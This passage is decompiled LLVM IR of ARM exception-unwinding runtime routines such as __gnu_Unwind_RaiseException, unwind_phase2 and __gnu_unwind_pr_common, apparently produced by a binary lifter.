.thread2.dec_label_pc_188a0_crit_edge:            ; preds = %dec_label_pc_1888c
  br label %dec_label_pc_188a0

dec_label_pc_188a0:                               ; preds = %.thread2.dec_label_pc_188a0_crit_edge, %dec_label_pc_18904
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_188b0 = load i32, i32* @r5, align 4
  store i32 %v0_188b0, i32* @r3, align 4
  store i32 100544, i32* @lr, align 4
  call void @__pseudo_branch(i32 %v3_18850)
  br i1 false, label %dec_label_pc_188c8, label %dec_label_pc_188f0

dec_label_pc_188c8:                               ; preds = %dec_label_pc_188a0
  br i1 undef, label %dec_label_pc_188d0, label %dec_label_pc_188f4

dec_label_pc_188d0:                               ; preds = %dec_label_pc_188c8
  br i1 undef, label %dec_label_pc_18950, label %dec_label_pc_188e8

dec_label_pc_188e8:                               ; preds = %dec_label_pc_188d0
  br i1 undef, label %dec_label_pc_18948, label %dec_label_pc_188f0

dec_label_pc_188f0:                               ; preds = %dec_label_pc_188a0, %dec_label_pc_188e8
  br label %dec_label_pc_188f4

dec_label_pc_188f4:                               ; preds = %dec_label_pc_188c8, %dec_label_pc_188f0
  store i32 9, i32* %r0.global-to-local, align 4
  ret i32 9

dec_label_pc_18904:                               ; preds = %dec_label_pc_1888c
  store i32 %v11_18848, i32* @r3, align 4
  %v2_18908 = ptrtoint i32* %next_vrs_-648 to i32
  store i32 %v2_18908, i32* @r4, align 4
  %v1_1890c = load i32, i32* @r5, align 4
  %v2_1890c = add i32 %v1_1890c, 20
  %v3_1890c = inttoptr i32 %v2_1890c to i32*
  store i32 %v11_18848, i32* %v3_1890c, align 4
  store i32 %v2_18908, i32* @r0, align 4
  store i32 %.pre, i32* @r1, align 4
  store i32 304, i32* @r2, align 4
  %v0_1891c = call i32 @memcpy()
  %v0_18924 = load i32, i32* @r6, align 4
  store i32 %v0_18924, i32* %r0.global-to-local, align 4
  %v0_18928 = load i32, i32* @r5, align 4
  %v1_1892c = add i32 %v0_18928, 16
  %v2_1892c = inttoptr i32 %v1_1892c to i32*
  %v3_1892c = load i32, i32* %v2_1892c, align 4
  store i32 %v3_1892c, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v3_1892c)
  %v0_1893c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1893c, i32* @r4, align 4
  br label %dec_label_pc_188a0

dec_label_pc_18948:                               ; preds = %dec_label_pc_188e8
  br label %dec_label_pc_18950

dec_label_pc_18950:                               ; preds = %dec_label_pc_188d0, %dec_label_pc_18948
  br label %dec_label_pc_18888

; uselistorder directives
  uselistorder i32 %v11_18848, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 10, 5, 6, 7, 8, 9, 0 }
  uselistorder i32 ()* @memcpy, { 2, 6, 5, 1, 0, 4, 3, 8, 7 }
  uselistorder i32* @r3, { 107, 108, 40, 41, 29, 109, 110, 32, 111, 112, 3, 113, 114, 115, 4, 116, 117, 118, 5, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 0, 137, 138, 139, 140, 30, 31, 33, 34, 35, 36, 37, 38, 39, 91, 65, 66, 67, 141, 142, 155, 156, 157, 145, 146, 147, 148, 149, 1, 150, 6, 43, 44, 143, 144, 56, 57, 104, 105, 106, 101, 102, 97, 98, 100, 99, 9, 10, 11, 161, 158, 159, 160, 2, 162, 163, 164, 42, 68, 45, 46, 47, 48, 49, 50, 151, 152, 153, 154, 58, 59, 60, 75, 76, 77, 78, 69, 70, 71, 8, 79, 80, 81, 82, 83, 24, 25, 26, 27, 12, 18, 13, 14, 15, 16, 17, 19, 20, 21, 22, 23, 28, 51, 52, 53, 103, 54, 55, 61, 62, 63, 64, 72, 7, 73, 74, 84, 85, 86, 87, 88, 89, 90, 92, 93, 94, 95, 96 }
  uselistorder i32 10, { 4, 5, 29, 30, 31, 8, 43, 42, 75, 0, 39, 40, 74, 44, 45, 1, 10, 33, 34, 28, 11, 27, 12, 13, 14, 24, 6, 35, 25, 15, 3, 26, 36, 16, 37, 38, 32, 17, 18, 19, 41, 9, 46, 47, 2, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 20, 59, 60, 61, 21, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 7, 72, 22, 73, 23 }
  uselistorder i32 %ucbp, { 1, 0, 2, 3, 4 }
  uselistorder label %dec_label_pc_18950, { 1, 0 }
  uselistorder label %dec_label_pc_188f4, { 1, 0 }
  uselistorder label %dec_label_pc_188f0, { 1, 0 }
  uselistorder label %dec_label_pc_188a0, { 1, 0 }
  uselistorder label %dec_label_pc_1888c, { 1, 0 }
}

define i32 @__gnu_Unwind_ForcedUnwind(i32 %ucbp, i32 %stop_fn, i8* %stop_arg, i32 %entry_vrs) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %stop_arg to i32
  %v2_18964 = add i32 %ucbp, 12
  %v3_18964 = inttoptr i32 %v2_18964 to i32*
  store i32 %stop_fn, i32* %v3_18964, align 4
  %v3_18968 = add i32 %ucbp, 24
  %v4_18968 = inttoptr i32 %v3_18968 to i32*
  store i32 %tmp, i32* %v4_18968, align 4
  %v1_1896c = add i32 %entry_vrs, 60
  %v2_1896c = inttoptr i32 %v1_1896c to i32*
  %v3_1896c = load i32, i32* %v2_1896c, align 4
  %v2_18974 = add i32 %entry_vrs, 64
  %v3_18974 = inttoptr i32 %v2_18974 to i32*
  store i32 %v3_1896c, i32* %v3_18974, align 4
  %v3_1897c = call i32 @unwind_phase2_forced(i32 %entry_vrs, i32 0, i32 0)
  ret i32 %v3_1897c

; uselistorder directives
  uselistorder i32 %entry_vrs, { 2, 0, 1 }
}

define void @unwind_phase2(i32 %ucbp, i32 %vrs) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  store i32 %ucbp, i32* @r4, align 4
  store i32 %vrs, i32* @r5, align 4
  store i32 %ucbp, i32* %r0.global-to-local, align 4
  %v1_189946 = add i32 %vrs, 64
  %v2_189947 = inttoptr i32 %v1_189946 to i32*
  %v3_189948 = load i32, i32* %v2_189947, align 4
  %v2_189989 = call i32 @get_eit_entry(i32 %ucbp, i32 %v3_189948)
  store i32 %v2_189989, i32* %r0.global-to-local, align 4
  %v2_1899c11 = icmp eq i32 %v2_189989, 0
  br i1 %v2_1899c11, label %dec_label_pc_189a4, label %dec_label_pc_189d4

dec_label_pc_189a4:                               ; preds = %entry, %dec_label_pc_189a4.dec_label_pc_18990_crit_edge
  %v0_189a4 = load i32, i32* @r5, align 4
  %v1_189a4 = add i32 %v0_189a4, 64
  %v2_189a4 = inttoptr i32 %v1_189a4 to i32*
  %v3_189a4 = load i32, i32* %v2_189a4, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v1_189ac = load i32, i32* @r4, align 4
  %v2_189ac = add i32 %v1_189ac, 20
  %v3_189ac = inttoptr i32 %v2_189ac to i32*
  store i32 %v3_189a4, i32* %v3_189ac, align 4
  %v0_189b0 = load i32, i32* @r4, align 4
  %v1_189b8 = add i32 %v0_189b0, 16
  %v2_189b8 = inttoptr i32 %v1_189b8 to i32*
  %v3_189b8 = load i32, i32* %v2_189b8, align 4
  call void @__pseudo_branch(i32 %v3_189b8)
  %v0_189c4 = load i32, i32* %r0.global-to-local, align 4
  %v7_189c4 = icmp eq i32 %v0_189c4, 8
  br i1 %v7_189c4, label %dec_label_pc_189a4.dec_label_pc_18990_crit_edge, label %dec_label_pc_189cc

dec_label_pc_189a4.dec_label_pc_18990_crit_edge:  ; preds = %dec_label_pc_189a4
  %v0_18990.pre = load i32, i32* @r4, align 4
  %v0_18994.pre = load i32, i32* @r5, align 4
  store i32 %v0_18990.pre, i32* %r0.global-to-local, align 4
  %v1_18994 = add i32 %v0_18994.pre, 64
  %v2_18994 = inttoptr i32 %v1_18994 to i32*
  %v3_18994 = load i32, i32* %v2_18994, align 4
  %v2_18998 = call i32 @get_eit_entry(i32 %v0_18990.pre, i32 %v3_18994)
  store i32 %v2_18998, i32* %r0.global-to-local, align 4
  %v2_1899c = icmp eq i32 %v2_18998, 0
  br i1 %v2_1899c, label %dec_label_pc_189a4, label %dec_label_pc_189d4

dec_label_pc_189cc:                               ; preds = %dec_label_pc_189a4
  %v7_189cc = icmp eq i32 %v0_189c4, 7
  br i1 %v7_189cc, label %dec_label_pc_189d8, label %dec_label_pc_189d4

dec_label_pc_189d4:                               ; preds = %entry, %dec_label_pc_189a4.dec_label_pc_18990_crit_edge, %dec_label_pc_189cc
  %v0_189d4 = call i32 @abort()
  store i32 %v0_189d4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_189d8

dec_label_pc_189d8:                               ; preds = %dec_label_pc_189cc, %dec_label_pc_189d4
  %v0_189d8 = load i32, i32* @r5, align 4
  %v1_189d8 = add i32 %v0_189d8, 4
  store i32 %v1_189d8, i32* %r0.global-to-local, align 4
  %v1_189dc = inttoptr i32 %v1_189d8 to i32*
  %v2_189dc = call i32 @__restore_core_regs(i32* %v1_189dc)
  store i32 %v2_189dc, i32* %r0.global-to-local, align 4
  ret void

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 2, 1, 5, 7, 6, 3, 4, 9, 8, 0 }
  uselistorder label %dec_label_pc_189d8, { 1, 0 }
  uselistorder label %dec_label_pc_189d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_189a4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  store i32 %entry_vrs, i32* %r1.global-to-local, align 4
  %v1_189e0 = add i32 %ucbp, 20
  %v2_189e0 = inttoptr i32 %v1_189e0 to i32*
  %v3_189e0 = load i32, i32* %v2_189e0, align 4
  %v1_189e8 = load i32, i32* %r1.global-to-local, align 4
  %v2_189e8 = add i32 %v1_189e8, 64
  %v3_189e8 = inttoptr i32 %v2_189e8 to i32*
  store i32 %v3_189e0, i32* %v3_189e8, align 4
  %v1_189ec = add i32 %ucbp, 12
  %v2_189ec = inttoptr i32 %v1_189ec to i32*
  %v3_189ec = load i32, i32* %v2_189ec, align 4
  %v2_189f0 = icmp eq i32 %v3_189ec, 0
  store i32 %ucbp, i32* @r4, align 4
  %v0_189fc = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_189fc, i32* @r5, align 4
  br i1 %v2_189f0, label %dec_label_pc_18a04, label %dec_label_pc_18a40

dec_label_pc_18a04:                               ; preds = %entry
  store i32 %ucbp, i32* %r1.global-to-local, align 4
  %v1_18a10 = add i32 %ucbp, 16
  %v2_18a10 = inttoptr i32 %v1_18a10 to i32*
  %v3_18a10 = load i32, i32* %v2_18a10, align 4
  call void @__pseudo_branch(i32 %v3_18a10)
  br i1 false, label %dec_label_pc_18a38, label %dec_label_pc_18a24

dec_label_pc_18a24:                               ; preds = %dec_label_pc_18a04
  call void @__pseudo_cond_branch(i1 true, i32 ptrtoint (i32* @global_var_137f8.550 to i32))
  %v0_18a2c = load i32, i32* @r4, align 4
  %v0_18a30 = load i32, i32* @r5, align 4
  store i32 %v0_18a30, i32* %r1.global-to-local, align 4
  call void @unwind_phase2(i32 %v0_18a2c, i32 %v0_18a30)
  br label %dec_label_pc_18a38

dec_label_pc_18a38:                               ; preds = %dec_label_pc_18a04, %dec_label_pc_18a24
  %v0_18a38 = load i32, i32* @r5, align 4
  %v1_18a38 = add i32 %v0_18a38, 4
  %v1_18a3c = inttoptr i32 %v1_18a38 to i32*
  %v2_18a3c = call i32 @__restore_core_regs(i32* %v1_18a3c)
  %v1_18a44.pre = load i32, i32* @r1, align 4
  br label %dec_label_pc_18a40

dec_label_pc_18a40:                               ; preds = %entry, %dec_label_pc_18a38
  %v1_18a44 = phi i32 [ %v0_189fc, %entry ], [ %v1_18a44.pre, %dec_label_pc_18a38 ]
  %v3_18a44 = call i32 @unwind_phase2_forced(i32 1, i32 %v1_18a44, i32 1)
  %v0_18a48 = call i32 @abort()
  ret i32 %v0_18a48

; uselistorder directives
  uselistorder i32* %r1.global-to-local, { 3, 4, 0, 1, 2 }
  uselistorder i32 ()* @abort, { 6, 5, 4, 3, 2, 1, 9, 8, 10, 7, 0 }
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 45, 46, 47, 48, 49, 51, 20, 17, 18, 19, 13, 14, 15, 21, 22, 16, 4, 5, 6, 7, 8, 9, 10, 11, 12, 32, 56, 60, 59, 58, 52, 53, 40, 41, 42, 43, 44, 54, 55, 57, 35, 36, 50, 33, 37, 34, 26, 27, 23, 24, 25, 0, 28, 29, 30, 31, 38, 39, 1, 2, 3 }
  uselistorder i1 true, { 0, 1, 2, 3, 96, 139, 4, 140, 141, 142, 143, 5, 82, 115, 144, 6, 81, 145, 7, 80, 146, 147, 148, 149, 8, 150, 116, 9, 84, 151, 10, 83, 152, 153, 11, 154, 155, 156, 12, 157, 158, 13, 159, 14, 118, 160, 161, 117, 162, 163, 15, 85, 16, 164, 165, 166, 167, 168, 169, 170, 171, 172, 173, 18, 87, 19, 174, 175, 176, 20, 86, 177, 21, 17, 178, 179, 22, 180, 181, 182, 23, 183, 184, 185, 186, 187, 24, 25, 119, 26, 27, 28, 138, 88, 188, 189, 89, 190, 121, 191, 192, 30, 193, 194, 31, 90, 196, 29, 197, 195, 198, 120, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 92, 43, 44, 45, 46, 47, 98, 200, 218, 79, 93, 100, 204, 103, 102, 101, 48, 51, 199, 91, 99, 201, 202, 203, 124, 205, 206, 207, 208, 209, 52, 53, 210, 211, 212, 213, 125, 214, 215, 49, 50, 216, 217, 123, 122, 54, 55, 56, 219, 57, 58, 104, 105, 111, 106, 112, 107, 110, 220, 108, 114, 221, 59, 222, 60, 223, 126, 127, 224, 128, 129, 225, 130, 131, 61, 62, 226, 132, 133, 63, 64, 227, 134, 135, 65, 66, 228, 136, 137, 67, 68, 97, 229, 230, 113, 231, 69, 109, 70, 71, 94, 72, 73, 95, 74, 75, 76, 77, 78 }
  uselistorder i32 %ucbp, { 1, 0, 2, 4, 3 }
  uselistorder label %dec_label_pc_18a40, { 1, 0 }
  uselistorder label %dec_label_pc_18a38, { 1, 0 }
}

define i32 @__gnu_Unwind_RaiseException(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %saved_vrs_-320 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_18a4c = load i32, i32* @r4, align 4
  store i32 %v3_18a4c, i32* %stack_var_-16, align 4
  %v6_18a4c = load i32, i32* @r5, align 4
  %v9_18a4c = load i32, i32* @r6, align 4
  %v12_18a4c = load i32, i32* @lr, align 4
  %v1_18a50 = add i32 %entry_vrs, 60
  %v2_18a50 = inttoptr i32 %v1_18a50 to i32*
  %v3_18a50 = load i32, i32* %v2_18a50, align 4
  %v2_18a54 = add i32 %entry_vrs, 64
  %v3_18a54 = inttoptr i32 %v2_18a54 to i32*
  store i32 %v3_18a50, i32* %v3_18a54, align 4
  store i32 %entry_vrs, i32* @r6, align 4
  store i32 %ucbp, i32* @r5, align 4
  %v11_18a84 = load i32, i32* %v3_18a54, align 4
  store i32 -1, i32* %saved_vrs_-320, align 4
  %v2_18a9c = call i32 @get_eit_entry(i32 %ucbp, i32 %v11_18a84)
  %v2_18aa0 = icmp eq i32 %v2_18a9c, 0
  br i1 %v2_18aa0, label %dec_label_pc_18aa8, label %dec_label_pc_18adc

dec_label_pc_18aa8:                               ; preds = %entry
  %v0_18aa8 = load i32, i32* @r5, align 4
  %v1_18ab0 = add i32 %v0_18aa8, 16
  %v2_18ab0 = inttoptr i32 %v1_18ab0 to i32*
  %v3_18ab0 = load i32, i32* %v2_18ab0, align 4
  call void @__pseudo_branch(i32 %v3_18ab0)
  store i32 0, i32* %r4.global-to-local, align 4
  %v2_18ac8 = load i32, i32* %saved_vrs_-320, align 4
  %v1_18acc = urem i32 %v2_18ac8, 2
  %v2_18acc = icmp eq i32 %v1_18acc, 0
  br i1 %v2_18acc, label %dec_label_pc_18aec, label %dec_label_pc_18ad4

dec_label_pc_18ad4:                               ; preds = %dec_label_pc_18aa8, %dec_label_pc_18aec
  %v0_18ad4 = phi i1 [ false, %dec_label_pc_18aa8 ], [ %phitmp, %dec_label_pc_18aec ]
  br i1 %v0_18ad4, label %dec_label_pc_18af8, label %dec_label_pc_18adc

dec_label_pc_18adc:                               ; preds = %entry, %dec_label_pc_18ad4
  %v2_18ae4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_18ae4, i32* @r4, align 4
  store i32 %v6_18a4c, i32* @r5, align 4
  store i32 %v9_18a4c, i32* @r6, align 4
  store i32 %v12_18a4c, i32* @lr, align 4
  ret i32 9

dec_label_pc_18aec:                               ; preds = %dec_label_pc_18aa8
  %v2_18aec = ptrtoint i32* %stack_var_-248 to i32
  store i32 %v2_18aec, i32* @r0, align 4
  %v1_18af0 = call i32 @__gnu_Unwind_Restore_VFP(i32 %v2_18aec)
  %v0_18ad4.pre = load i32, i32* %r4.global-to-local, align 4
  %phitmp = icmp eq i32 %v0_18ad4.pre, 6
  br label %dec_label_pc_18ad4

dec_label_pc_18af8:                               ; preds = %dec_label_pc_18ad4
  %v0_18af8 = load i32, i32* @r5, align 4
  %v0_18afc = load i32, i32* @r6, align 4
  call void @unwind_phase2(i32 %v0_18af8, i32 %v0_18afc)
  ret i32 ptrtoint (i32* @0 to i32)

; uselistorder directives
  uselistorder i32 (i32, i32)* @get_eit_entry, { 3, 2, 0, 1 }
  uselistorder i32 %entry_vrs, { 0, 2, 1 }
  uselistorder label %dec_label_pc_18adc, { 1, 0 }
  uselistorder label %dec_label_pc_18ad4, { 1, 0 }
}

define i32 @__gnu_Unwind_Resume_or_Rethrow(i32 %ucbp, i32 %entry_vrs) local_unnamed_addr {
entry:
  %v1_18b04 = add i32 %ucbp, 12
  %v2_18b04 = inttoptr i32 %v1_18b04 to i32*
  %v3_18b04 = load i32, i32* %v2_18b04, align 4
  %v2_18b08 = icmp eq i32 %v3_18b04, 0
  br i1 %v2_18b08, label %dec_label_pc_18b10, label %dec_label_pc_18b14

dec_label_pc_18b10:                               ; preds = %entry
  %v2_18b10 = call i32 @__gnu_Unwind_RaiseException(i32 0, i32 %entry_vrs)
  br label %dec_label_pc_18b14

dec_label_pc_18b14:                               ; preds = %entry, %dec_label_pc_18b10
  %v1_18b14 = add i32 %entry_vrs, 60
  %v2_18b14 = inttoptr i32 %v1_18b14 to i32*
  %v3_18b14 = load i32, i32* %v2_18b14, align 4
  %v2_18b1c = add i32 %entry_vrs, 64
  %v3_18b1c = inttoptr i32 %v2_18b1c to i32*
  store i32 %v3_18b14, i32* %v3_18b1c, align 4
  %v3_18b20 = call i32 @unwind_phase2_forced(i32 0, i32 %entry_vrs, i32 0)
  ret i32 %v3_18b20

; uselistorder directives
  uselistorder i32 (i32, i32, i32)* @unwind_phase2_forced, { 1, 0, 2 }
  uselistorder i32 %entry_vrs, { 1, 3, 2, 0 }
  uselistorder label %dec_label_pc_18b14, { 1, 0 }
}

define i32 @_Unwind_VRS_Pop(i32 %context, i32 %regclass, i32 %discriminator, i32 %representation) local_unnamed_addr {
entry:
  %tmp = icmp ult i32 %regclass, 5
  br i1 %tmp, label %bb, label %dec_label_pc_18b80

bb:                                               ; preds = %entry
  %v7_18b38 = mul i32 %regclass, 4
  %v8_18b38 = add i32 %v7_18b38, ptrtoint (i32* @global_var_18b40.704 to i32)
  call void @__pseudo_branch(i32 %v8_18b38)
  br label %dec_label_pc_18b80

dec_label_pc_18b80:                               ; preds = %bb, %entry
  ret i32 2

; uselistorder directives
  uselistorder i32 %regclass, { 1, 0 }
}

define i32 @__gnu_unwind_pr_common(i32 %state, i32 %ucbp, i32 %context, i32 %id) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %context, i32* %r2.global-to-local, align 4
  store i32 %state, i32* %r0.global-to-local, align 4
  %forced_unwind_-44 = alloca i32, align 4
  %uws_-60 = alloca %anon_struct_4, align 8
  %stack_var_-48 = alloca i32, align 4
  %v3_18c68 = load i32, i32* @r4, align 4
  %v6_18c68 = load i32, i32* @r5, align 4
  %v2_18c78 = icmp eq i32 %id, 0
  store i32 %ucbp, i32* @r8, align 4
  %v1_18c80 = add i32 %ucbp, 76
  %v2_18c80 = inttoptr i32 %v1_18c80 to i32*
  %v3_18c80 = load i32, i32* %v2_18c80, align 4
  %v1_18c8c = inttoptr i32 %v3_18c80 to i32*
  %v2_18c8c = load i32, i32* %v1_18c8c, align 4
  store i32 %v2_18c8c, i32* @lr, align 4
  %v4_18c8c = add i32 %v3_18c80, 4
  store i32 %context, i32* %fp.global-to-local, align 4
  %v1_18c98 = urem i32 %state, 4
  store i32 %v1_18c98, i32* %r2.global-to-local, align 4
  %v1_18c9c = and i32 %state, 8
  store i32 %v1_18c9c, i32* %r0.global-to-local, align 4
  %v4_18cac = getelementptr inbounds %anon_struct_4, %anon_struct_4* %uws_-60, i32 0, i32 0
  store i32 %v2_18c8c, i32* %v4_18cac, align 8
  br i1 %v2_18c78, label %dec_label_pc_18cbc, label %dec_label_pc_18f98

dec_label_pc_18cbc:                               ; preds = %entry
  %v3_18cbc = mul i32 %v2_18c8c, 256
  store i32 %v3_18cbc, i32* %v4_18cac, align 8
  store i32 3, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_18cd4

dec_label_pc_18cd4:                               ; preds = %dec_label_pc_18f98, %dec_label_pc_18cbc
  %v0_18cf8647090 = phi i32 [ %v2_18fb0, %dec_label_pc_18f98 ], [ %v4_18c8c, %dec_label_pc_18cbc ]
  store i32 %v1_18c98, i32* %r2.global-to-local, align 4
  %v1_18cd8 = add i32 %ucbp, 80
  %v2_18cd8 = inttoptr i32 %v1_18cd8 to i32*
  %v3_18cd8 = load i32, i32* %v2_18cd8, align 4
  %v7_18cdc = icmp eq i32 %v1_18c98, 2
  br i1 %v7_18cdc, label %bb, label %bb148

bb:                                               ; preds = %dec_label_pc_18cd4
  %v2_18ce0 = add i32 %ucbp, 56
  %v3_18ce0 = inttoptr i32 %v2_18ce0 to i32*
  %v4_18ce0 = load i32, i32* %v3_18ce0, align 4
  br label %bb148

bb148:                                            ; preds = %dec_label_pc_18cd4, %bb
  %v0_18cf86470 = phi i32 [ %v0_18cf8647090, %dec_label_pc_18cd4 ], [ %v4_18ce0, %bb ]
  %v1_18ce4 = urem i32 %v3_18cd8, 2
  %v2_18ce4 = icmp eq i32 %v1_18ce4, 0
  br i1 %v2_18ce4, label %dec_label_pc_18cf8.preheader, label %bb149

bb149:                                            ; preds = %bb148
  br label %dec_label_pc_18db8

dec_label_pc_18cf8.preheader:                     ; preds = %bb148
  %v1_18cf86571 = inttoptr i32 %v0_18cf86470 to i32*
  %v2_18cf86672 = load i32, i32* %v1_18cf86571, align 4
  %v2_18cfc6874 = icmp eq i32 %v2_18cf86672, 0
  br i1 %v2_18cfc6874, label %dec_label_pc_18db8, label %dec_label_pc_18d04.preheader.lr.ph.lr.ph

dec_label_pc_18d04.preheader.lr.ph.lr.ph:         ; preds = %dec_label_pc_18cf8.preheader
  %v7_18d08 = icmp eq i32 %id, 2
  %v2_18d94 = icmp eq i32 %v1_18c98, 0
  %v2_18f60 = ptrtoint i32* %forced_unwind_-44 to i32
  %v3_18e7c = icmp eq i32 %v1_18c9c, 0
  br label %dec_label_pc_18d04.preheader.lr.ph

dec_label_pc_18d04.preheader.lr.ph:               ; preds = %dec_label_pc_18d04.preheader.lr.ph.lr.ph, %dec_label_pc_18fcc
  %v1_18d1496 = phi i32 [ %v2_18cf86672, %dec_label_pc_18d04.preheader.lr.ph.lr.ph ], [ %v2_18cf866, %dec_label_pc_18fcc ]
  %v1_18d1093 = phi i32 [ %v0_18cf86470, %dec_label_pc_18d04.preheader.lr.ph.lr.ph ], [ %v2_18fd0, %dec_label_pc_18fcc ]
  %stack_var_-76.2.ph3175 = phi i32 [ 0, %dec_label_pc_18d04.preheader.lr.ph.lr.ph ], [ %stack_var_-76.4, %dec_label_pc_18fcc ]
  br label %dec_label_pc_18d04.preheader

dec_label_pc_18d04.preheader:                     ; preds = %dec_label_pc_18d04.preheader.lr.ph, %dec_label_pc_18f90
  %v1_18d1495 = phi i32 [ %v1_18d1496, %dec_label_pc_18d04.preheader.lr.ph ], [ %v2_18cf8, %dec_label_pc_18f90 ]
  %v1_18d1092 = phi i32 [ %v1_18d1093, %dec_label_pc_18d04.preheader.lr.ph ], [ %v1_18f90, %dec_label_pc_18f90 ]
  br label %dec_label_pc_18d04

dec_label_pc_18d04:                               ; preds = %dec_label_pc_18d04.preheader, %dec_label_pc_18da8
  %v1_18d14 = phi i32 [ %v1_18d1495, %dec_label_pc_18d04.preheader ], [ %v2_18dac, %dec_label_pc_18da8 ]
  %v1_18d28 = phi i32 [ %v1_18d1092, %dec_label_pc_18d04.preheader ], [ %v1_18da8, %dec_label_pc_18da8 ]
  store i32 %id, i32* %r2.global-to-local, align 4
  br i1 %v7_18d08, label %bb151, label %.thread16

bb151:                                            ; preds = %dec_label_pc_18d04
  %v2_18d0c = add i32 %v1_18d28, 4
  %v3_18d0c = inttoptr i32 %v2_18d0c to i32*
  %v4_18d0c = load i32, i32* %v3_18d0c, align 4
  store i32 %v4_18d0c, i32* @r5, align 4
  store i32 %v1_18d14, i32* @r6, align 4
  %v0_18d18109 = load i32, i32* @r8, align 4
  %v1_18d18110 = add i32 %v0_18d18109, 72
  %v2_18d18111 = inttoptr i32 %v1_18d18110 to i32*
  %v3_18d18112 = load i32, i32* %v2_18d18111, align 4
  store i32 %v3_18d18112, i32* @lr, align 4
  %v2_18d24 = add i32 %v1_18d28, 8
  br label %bb152

.thread16:                                        ; preds = %dec_label_pc_18d04
  %v2_18d10 = add i32 %v1_18d28, 2
  %v3_18d10 = inttoptr i32 %v2_18d10 to i16*
  %v4_18d10 = load i16, i16* %v3_18d10, align 2
  %v5_18d10 = zext i16 %v4_18d10 to i32
  store i32 %v5_18d10, i32* @r5, align 4
  %v0_18d18 = load i32, i32* @r8, align 4
  %v1_18d18 = add i32 %v0_18d18, 72
  %v2_18d18 = inttoptr i32 %v1_18d18 to i32*
  %v3_18d18 = load i32, i32* %v2_18d18, align 4
  store i32 %v3_18d18, i32* @lr, align 4
  %v2_18d20 = inttoptr i32 %v1_18d28 to i16*
  %v3_18d20 = load i16, i16* %v2_18d20, align 2
  %v4_18d20 = zext i16 %v3_18d20 to i32
  store i32 %v4_18d20, i32* @r6, align 4
  %v2_18d28 = add i32 %v1_18d28, 4
  br label %bb152

bb152:                                            ; preds = %bb151, %.thread16
  %storemerge121 = phi i32 [ %v2_18d28, %.thread16 ], [ %v2_18d24, %bb151 ]
  %v3_18d18115 = phi i32 [ %v3_18d18, %.thread16 ], [ %v3_18d18112, %bb151 ]
  %v0_18d30113 = phi i32 [ %v5_18d10, %.thread16 ], [ %v4_18d0c, %bb151 ]
  store i32 %storemerge121, i32* @r7, align 4
  %v1_18d30 = and i32 %v0_18d30113, -2
  %v2_18d34 = add i32 %v1_18d30, %v3_18d18115
  store i32 %v2_18d34, i32* @r4, align 4
  store i32 15, i32* %r2.global-to-local, align 4
  %v0_18d44 = load i32, i32* %fp.global-to-local, align 4
  store i32 %v0_18d44, i32* %r0.global-to-local, align 4
  %v5_18d50 = call i32 @_Unwind_VRS_Get(i32 %v0_18d44, i32 15, i32 0, i32 0, i8* bitcast (i32* @0 to i8*))
  store i32 %v5_18d50, i32* %r0.global-to-local, align 4
  %v3_18d54 = load i32, i32* %stack_var_-48, align 4
  store i32 %v3_18d54, i32* %r2.global-to-local, align 4
  %v0_18d58 = load i32, i32* @r4, align 4
  %tmp = icmp ugt i32 %v0_18d58, %v3_18d54
  br i1 %tmp, label %._crit_edge, label %dec_label_pc_18d64

._crit_edge:                                      ; preds = %bb152
  %v0_18d7c.pre = load i32, i32* @r6, align 4
  br label %bb154

dec_label_pc_18d64:                               ; preds = %bb152
  %v0_18d64 = load i32, i32* @r6, align 4
  %v1_18d64 = and i32 %v0_18d64, -2
  %v2_18d68 = add i32 %v1_18d64, %v0_18d58
  %v3_18d6c = icmp ult i32 %v3_18d54, %v2_18d68
  br i1 %v3_18d6c, label %.thread20, label %bb153

bb153:                                            ; preds = %dec_label_pc_18d64
  br label %bb154

.thread20:                                        ; preds = %dec_label_pc_18d64
  br label %bb154

bb154:                                            ; preds = %bb153, %._crit_edge, %.thread20
  %v0_18d7c = phi i32 [ %v0_18d7c.pre, %._crit_edge ], [ %v0_18d64, %bb153 ], [ %v0_18d64, %.thread20 ]
  %v0_18f24 = phi i32 [ 0, %._crit_edge ], [ 0, %bb153 ], [ 1, %.thread20 ]
  %v0_18d78 = load i32, i32* @r5, align 4
  %v1_18d7c = urem i32 %v0_18d7c, 2
  %v1_18d78 = mul i32 %v0_18d78, 2
  %v3_18d80 = and i32 %v1_18d78, 2
  %v4_18d80 = or i32 %v3_18d80, %v1_18d7c
  store i32 %v4_18d80, i32* %r2.global-to-local, align 4
  %v7_18d84 = icmp eq i32 %v4_18d80, 1
  br i1 %v7_18d84, label %dec_label_pc_18f18, label %dec_label_pc_18d8c

dec_label_pc_18d8c:                               ; preds = %bb154
  %v2_18d84 = icmp eq i32 %v4_18d80, 0
  br i1 %v2_18d84, label %dec_label_pc_18d90, label %dec_label_pc_18e40

